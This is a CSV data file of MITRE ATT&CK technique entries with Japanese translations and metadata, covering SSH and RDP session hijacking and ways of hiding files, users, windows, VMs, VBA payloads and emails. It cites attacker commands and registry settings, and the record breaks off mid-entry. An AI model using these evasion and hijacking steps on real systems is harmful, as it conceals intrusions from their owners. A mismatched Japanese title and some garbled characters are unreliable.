T1563.001,T1563,SSH Hijacking,スピアフィッシングリンク,"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair. In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack) [SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",攻撃者は正当なユーザーのSSHセッションを乗っ取り、環境内で横方向に移動することがある。Secure Shell（SSH）はLinuxおよびmacOSシステムにおける標準的なリモートアクセス手段である。ユーザーは暗号化されたトンネルを介して他システムに接続でき、通常はパスワード、証明書、または非対称暗号鍵ペアによる認証が行われる。 侵害されたホストから横方向に移動するため、攻撃者はアクティブなSSHセッションにおける公開鍵認証を介して他のシステムと確立された信頼関係を利用し、既存の接続を乗っ取る可能性がある。これはSSHエージェント自体を侵害するか、エージェントのソケットへのアクセス権を得ることで発生し得る。 攻撃者がrootアクセス権を取得できれば、SSHセッションの乗っ取りは容易であると考えられます。（引用元：Slideshare Abusing SSH）（引用元：SSHjack Blackhat）（引用元：Clockwork SSH Agent Hijacking）（引用元：Breach Post-mortem SSH Hijack）[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) は、[SSH](https://attack.mitre.org/techniques/T1021/004) の使用とは異なり、[有効なアカウント](https://attack.mitre.org/techniques/T1078) を使用して新しいセッションを作成するのではなく、既存の SSH セッションをハイジャックします。,lateral-movement,Linux;macOS,credential_abuse,boundary_crossing,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8,2020-02-25T18:34:38.290Z,2025-04-15T21:40:37.838Z,,,,
T1563.002,T1563,RDP Hijacking,RDP ハイジャック,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)",攻撃者は正当なユーザーのリモートデスクトップセッションを乗っ取り、環境内で横方向に移動する可能性があります。 リモートデスクトップはオペレーティングシステムに広く搭載されている機能です。これによりユーザーは、リモートシステム上のシステムデスクトップグラフィカルユーザーインターフェース（GUI）で対話型セッションにログインできます。マイクロソフトは自社のリモートデスクトッププロトコル（RDP）実装をリモートデスクトップサービス（RDS）と呼称しています（出典：TechNet Remote Desktop Services）。攻撃者は正当なユーザーのリモートセッションを盗むRDPセッションハイジャックを実行する可能性があります。 通常、セッションの乗っ取りを試みる者がいる場合、ユーザーには通知が行われます。しかしシステム権限を持ち、ターミナルサービスコンソール（`c:\windows\system32\tscon.exe [乗っ取るセッション番号]`）を使用すれば、攻撃者は認証情報やユーザーへのプロンプトを必要とせずにセッションをハイジャックできます（引用元: RDP Hijacking Korznikov）。これはリモート/ローカル環境、アクティブ/切断済みセッションを問わず実行可能です。(引用元: RDPハイジャック Medium) ドメイン管理者以上の特権アカウントセッションを盗むことで、[リモートシステム発見](https://attack.mitre.org/techniques/T1018)や権限昇格にも繋がる。これら全てはWindowsネイティブコマンドで実行可能だが、レッドチームツールの機能としても実装されている。(引用元: Kali Redsnarf),lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c,2020-02-25T18:35:42.765Z,2025-04-15T22:59:04.979Z,,,,
T1564,,Hide Artifacts,アーティファクトの隠蔽,"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015) Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",攻撃者は検知回避のため、自身の行動に関連するアーティファクトを隠蔽しようとする。OSには重要なシステムファイルや管理タスクの実行履歴など、ユーザー作業環境の妨害やシステム上のファイル・機能変更を防止する隠蔽機能が備わっている場合がある。攻撃者はこれらの機能を悪用し、ファイル・ディレクトリ・ユーザーアカウント・その他のシステム活動といったアーティファクトを隠蔽して検知を回避する。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)攻撃者はまた、仮想化技術の使用など、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することで、悪意のある行動に関連する痕跡を隠蔽しようとする可能性がある。(引用: Sophos Ragnar May 2020),defense-evasion,Linux;Office Suite;Windows;macOS;ESXi,other,stealth,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8,2020-02-26T17:41:25.933Z,2025-04-15T21:39:52.216Z,,,,
T1564.001,T1564,Hidden Files and Directories,隠しファイルとディレクトリ,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden Efile. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS). On Linux and Mac, users can mark specific files as hidden simply by putting a  E Eas the first character in the file or folder name (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period,  E E are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls E Users must specifically change settings to have these files viewable. Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys. Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",攻撃者は検出回避のため、ファイルやディレクトリを非表示に設定することがある。システム上の特殊ファイルを一般ユーザーが誤って変更するのを防ぐため、ほとんどのOSでは「隠しファイル」の概念が存在する。これらのファイルはGUIでファイルシステムを閲覧する際や、コマンドラインで通常のコマンドを使用する際には表示されない。 ユーザーは、一連のグラフィカルユーザーインターフェース（GUI）プロンプトまたはコマンドラインスイッチ（Windowsでは<code>dir /a</code>、LinuxおよびmacOSでは<code>ls –a</code>）を使用して、明示的に隠しファイルの表示を要求する必要があります。LinuxおよびMacでは、ファイル名またはフォルダ名の先頭に「.」を付けるだけで、特定のファイルを隠しファイルとしてマークできます (出典: Sofacy Komplex Trojan) (出典: Antiquated Mac Malware)。ピリオド（.）で始まるファイルやフォルダは、Finderアプリケーションや「ls」などの標準コマンドラインユーティリティではデフォルトで非表示になります。これらのファイルを表示するには、ユーザーが設定を変更する必要があります。 macOS上のファイルはUF_HIDDENフラグでマークすることも可能で、これによりFinder.appでは表示されなくなるが、Terminal.appでは表示される（引用元：WireLurker）。Windowsでは、attrib.exeバイナリを使用して特定のファイルを隠しファイルとしてマークできる。 多くのアプリケーションは、ユーザーの作業領域を乱雑にしないよう情報を保存するために、こうした隠しファイルや隠しフォルダを作成します。例えば、SSHユーティリティは隠し.sshフォルダを作成し、ユーザーの既知のホストや鍵を格納します。攻撃者はこれを悪用し、システム上の任意の場所にファイルやフォルダを隠し、隠しファイルの調査を含まない一般的なユーザーやシステム分析を回避することが可能です。,defense-evasion,Windows;macOS;Linux,remote_service_abuse,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d,2020-02-26T17:46:13.128Z,2025-04-25T14:48:27.868Z,,,,
T1564.002,T1564,Hidden Users,隠しユーザー,"Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user’s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) Adversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A) On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",攻撃者は、作成または変更したユーザーアカウントの存在を隠すために隠しユーザーを利用することがあります。管理者は、特定のシステムに多数のユーザーアカウントが存在する場合や、管理者アカウントやその他の管理用アカウントを他のユーザーから隠したい場合に、ユーザーを非表示にしたい場合があります。macOSでは、攻撃者はplistファイル、フォルダ属性、ユーザー属性を操作することで、ユーザーを隠しユーザーとして作成または変更できます。 ログイン画面やシステム環境設定にユーザーが表示されないようにするには、攻撃者はユーザーIDを500未満に設定し、<code>/Library/Preferences/com.apple.loginwindow</code>内のplistファイルで<code>Hide500Users</code>キーの値を<code>TRUE</code>に設定します。(引用元: Cybereason OSX Pirrit) すべてのユーザーにはユーザーIDが割り当てられています。<code>Hide500Users</code>キーの値が<code>TRUE</code>に設定されると、ユーザーIDが500未満のユーザーはログイン画面およびシステム環境設定に表示されなくなります。 コマンドラインを使用する場合、攻撃者は<code>dscl</code>ユーティリティを用いて<code>IsHidden</code>属性を<code>1</code>に設定することで隠しユーザーアカウントを作成できます。攻撃者はまた、<code>chflags</code>を隠し属性に変更することでユーザーのホームフォルダを非表示にすることも可能です。(引用元: Appleサポート ユーザーアカウントを非表示にする) 攻撃者は同様にWindowsでもユーザーアカウントを非表示にすることがあります。 攻撃者は特定のユーザーについて、<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> レジストリキーの値を<code>0</code>に設定し、そのユーザーがログオン画面に表示されないようにできます。(引用元: FireEye SMOKEDHAM 2021年6月)(引用元: US-CERT TA18-074A) Linux システムでは、攻撃者はログイン画面（グリーターとも呼ばれる）からユーザーアカウントを非表示にすることがあります。 攻撃者が使用する手法は、ディストリビューションが現在使用しているディスプレイマネージャーによって異なります。例えば、GNOMEディスプレイマネージャー（GDM）を使用するUbuntuシステムでは、<code>gsettings</code>コマンド（例：<code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>）を使用してグリーターからアカウントを非表示にすることが可能です。(引用: Hide GDM User Accounts)ディスプレイマネージャーは特定のディストリビューションに固定されておらず、ユーザーや攻撃者によって変更される可能性があります。,defense-evasion,macOS;Windows;Linux,script_command_execution,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d,2020-03-13T20:12:40.876Z,2025-04-15T22:39:51.186Z,,,,
T1564.003,T1564,Hidden Window,隠しウィンドウ,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware) On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019) The Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.(Citation: Cantoris Computing) In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack) All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.",攻撃者は、悪意のある活動をユーザーの視界から隠すために非表示ウィンドウを利用することがあります。アプリケーションが操作を実行する際に通常表示されるウィンドウを非表示にできる場合があります。これはシステム管理者が管理タスクを実行する際にユーザーの作業環境を妨げないために利用されることがあります。攻撃者は、システム上での自身の活動をユーザーに気付かれないようにするため、本来表示されるべきウィンドウをユーザーから隠すためにこれらの機能を悪用する可能性があります。(引用: 旧式のMacマルウェア)macOSでは、アプリケーションの実行設定はプロパティリスト(plist)ファイルに記述される。これらのファイル内のタグの一つである<code>apple.awt.UIElement</code>は、JavaアプリケーションがDockにアイコンを表示しないようにする機能を提供する。システムトレイで実行されるアプリケーションがDockに表示されないようにする場合に一般的に使用される。 同様に、Windowsではスクリプト言語（[PowerShell](https://attack.mitre.org/techniques/T1059/001)、Jscript、[Visual Basic](https://attack.mitre.org/techniques/T1059/005)など）にウィンドウを非表示にする様々な機能があります。 その一例が <code>powershell.exe -WindowStyle Hidden</code> です（引用元: PowerShell About 2019）。また、Windows レジストリを編集することで、現在のユーザーからアプリケーションウィンドウを非表示にすることもできます。 例えば、`HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` レジストリキー内の`WindowPosition`サブキーを最大値に設定すると、PowerShellウィンドウは画面外で開かれ非表示になります。(出典: Cantoris Computing) さらに、Windows は独自の <code>explorer.exe</code> プロセスを持つ非表示のデスクトップウィンドウを作成できる `CreateDesktop()` API をサポートしています。(引用: Hidden VNC)(引用: Anatomy of an hVNC Attack) 非表示のデスクトップウィンドウ上で実行されているすべてのアプリケーション（非表示の VNC (hVNC) セッションなど）は、他のデスクトップウィンドウからは見えません。(引用: Hidden VNC),defense-evasion,macOS;Windows;Linux,credential_abuse,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0,2020-03-13T20:26:49.433Z,2025-04-15T19:59:07.977Z,,,,
T1564.004,T1564,NTFS File Attributes,NTFS ファイル属性,"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014) Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",攻撃者は検出回避のため、悪意のあるデータを隠す目的でNTFSファイル属性を利用することがあります。すべてのNTFSフォーマットパーティションには、パーティション上の全ファイル/ディレクトリの記録を保持するマスターファイルテーブル（MFT）が含まれます。 (引用元: SpectorOps Host-Based Jul 2017) MFTエントリ内には、拡張属性(EA)やデータ属性（複数のデータ属性が存在する場合、代替データストリーム(ADS)として知られる）などのファイル属性(引用元: Microsoft NTFS File Attributes Aug 2010)が含まれており、任意のデータ（さらには完全なファイル）を保存するために使用できます。 (引用元: SpectorOps Host-Based Jul 2017) (引用元: Microsoft File Streams) (引用元: MalwareBytes ADS July 2015) (引用元: Microsoft ADS Mar 2014) 攻撃者は、ファイル属性メタデータに悪意のあるデータやバイナリを直接ファイル内に保存する代わりに格納することがあります。 これは、静的インジケータスキャンツールやアンチウイルスなどの防御を回避するために行われる可能性があります。(引用: Journey into IR ZeroAccess NTFS EA) (引用: MalwareBytes ADS July 2015),defense-evasion,Windows,discovery_enumeration,stealth,file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5,2020-03-13T20:33:00.009Z,2025-04-15T19:59:20.821Z,,,,
T1564.005,T1564,Hidden File System,隠しファイルシステム,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014) Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",攻撃者は、ユーザーやセキュリティツールから悪意のある活動を隠蔽するために隠しファイルシステムを使用することがある。ファイルシステムは、物理ストレージからデータを保存・アクセスするための構造を提供する。通常、ユーザーはアプリケーションを介してファイルシステムと関わり、物理的な位置（例：ディスクセクタ）から抽象化されたファイルやディレクトリにアクセスする。 標準的なファイルシステムにはFAT、NTFS、ext4、APFSなどがある。ファイルシステムにはNTFSのボリュームブートレコード（VBR）やマスターファイルテーブル（MFT）など、他の構造も含まれる場合がある。(引用元: MalwareTech VFS 2014年11月)攻撃者は、感染システム上の標準ファイルシステムとは別の、独自の抽象化されたファイルシステムを使用することがある。 これにより、攻撃者は悪意のあるコンポーネントの存在やファイル入出力をセキュリティツールから隠蔽できる。仮想ファイルシステムとも呼ばれる隠しファイルシステムは、様々な方法で実装可能である。一例として、ディスク構造や標準ファイルシステムパーティションが使用しない予約領域にファイルシステムを格納する方法がある。(引用: MalwareTech VFS 2014年11月)(引用: FireEye Bootkits) 別の実装例として、攻撃者が独自のポータブルパーティションイメージをファイルとして標準ファイルシステム上にドロップする方法がある。(引用: ESET ComRAT 2020年5月) 攻撃者はまた、既存のファイルシステム構造上で非標準的な方法でファイルを断片化させる場合もある。(引用: Kaspersky Equation QA),defense-evasion,Linux;macOS;Windows,other,stealth,user_interaction;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04,2020-06-28T22:55:55.719Z,2025-04-25T14:48:18.639Z,,,,
T1564.006,T1564,Run Virtual Instance,仮想インスタンスの実行,"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019) Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020) In VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility. Adding this command to `/etc/rc.local.d/local.sh` (i.e., [RC Scripts](https://attack.mitre.org/techniques/T1037/004)) will cause the VM to persistently restart.(Citation: vNinja Rogue VMs 2024) Creating a VM this way prevents it from appearing in the vCenter console or in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby hiding it from typical administrative activities.(Citation: MITRE VMware Abuse 2024)",攻撃者は検知回避のため仮想インスタンスを用いた悪意ある操作を実行する可能性がある。コンピューターやコンピューティング環境をエミュレートする多様な仮想化技術が存在する。 仮想インスタンス内で悪意のあるコードを実行することで、攻撃者は仮想インスタンス内の活動を監視できないセキュリティツールから、自身の行動に関連する痕跡を隠蔽できる。(引用: CyberCX Akira Ransomware) さらに、仮想ネットワークの実装方法（例: ブリッジ接続アダプタ）によっては、仮想インスタンスが生成するネットワークトラフィックが侵害されたホストに遡及しにくくなる可能性がある。これは、IPアドレスやホスト名が既知の値と一致しない場合があるためである。(引用元: SingHealth Breach Jan 2019) 攻撃者は仮想化機能のネイティブサポート（例: Hyper-V）を利用するか、仮想インスタンス実行に必要なファイル（例: VirtualBoxバイナリ）をドロップする可能性がある。 仮想インスタンスの実行後、攻撃者はゲストとホストの間に共有フォルダを作成し、仮想インスタンスがホストのファイルシステムとやり取りできる権限を設定する場合があります（引用元：Sophos Ragnar 2020年5月）。VMWare 環境では、攻撃者は vCenter コンソールを利用して新しい仮想マシンを作成する場合があります。 ただし、`/bin/vmx`ユーティリティで有効な`.vmx`ファイルを実行することで、ESXiサーバー上に直接仮想マシンを作成することも可能です。このコマンドを`/etc/rc.local.d/local.sh`（すなわち[RCスクリプト](https://attack.mitre.org/techniques/T1037/004)）に追加すると、VMが永続的に再起動します。(引用元: vNinja Rogue VMs 2024) この方法で作成された仮想マシンは、vCenterコンソールやESXiサーバー上の`vim-cmd vmsvc/getallvms`コマンドの出力に表示されないため、通常の管理活動から隠蔽されます。(引用元: MITRE VMware Abuse 2024),defense-evasion,Linux;macOS;Windows;ESXi,script_command_execution,stealth,authentication_system;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d,2020-06-29T15:36:41.535Z,2025-04-15T19:58:59.831Z,,,,
T1564.007,T1564,VBA Stomping,VBA ストンプ,"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020) MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream) An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",攻撃者は、MS Office文書内に埋め込まれた悪意のあるVisual Basic for Applications（VBA）ペイロードを、VBAソースコードを無害なデータで置き換えることで隠蔽する可能性がある。(引用: FireEye VBA stomp Feb 2020) VBAコンテンツを埋め込んだMS Office文書は、モジュールストリーム内にソースコードを格納する。 各モジュールストリームには<code>PerformanceCache</code>が存在し、p-codeと呼ばれるVBAソースコードの別個のコンパイル済みバージョンを格納する。p-codeは、<code>_VBA_PROJECT</code>ストリーム（VBAプロジェクトのバージョン依存の説明を含む）で指定されたMS Officeバージョンが、ホストMS Officeアプリケーションのバージョンと一致した場合に実行される。(引用: Evil Clippy 2019年5月)(引用: Microsoft _VBA_PROJECT Stream) 攻撃者は、悪意のあるVBAコードを隠蔽するため、VBAソースコードの保存領域をゼロ、無害なコード、またはランダムなバイトで上書きしつつ、事前にコンパイル済みの悪意のあるpコードを残すことが可能です。悪意のあるVBAソースコードをスキャンするツールは、不要なコードがコンパイル済みpコード内に隠されているため、回避される可能性があります。 VBA ソースコードが削除された場合、一部のツールはマクロが存在しないと判断することさえあります。<code>_VBA_PROJECT</code> ストリームとホストの MS Office アプリケーションのバージョンが一致する場合、p コードが実行されます。一致しない場合は、無害な VBA ソースコードが解凍され、p コードに再コンパイルされるため、悪意のある p コードが削除され、動的解析をバイパスできる可能性があります。(引用: Walmart ロバーツ 2018年10月)(引用: FireEye VBA stomp 2020年2月)(引用: pcodedmp Bontchev),defense-evasion,Linux;Windows;macOS,script_command_execution,stealth,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c898c4b5-bf36-4e6e-a4ad-5b8c4c13e35b,2020-09-17T12:51:40.845Z,2025-04-25T14:48:00.627Z,,,,
T1564.008,T1564,Email Hiding Rules,E メールの非表示ルール,"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule) Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account. Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security) In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 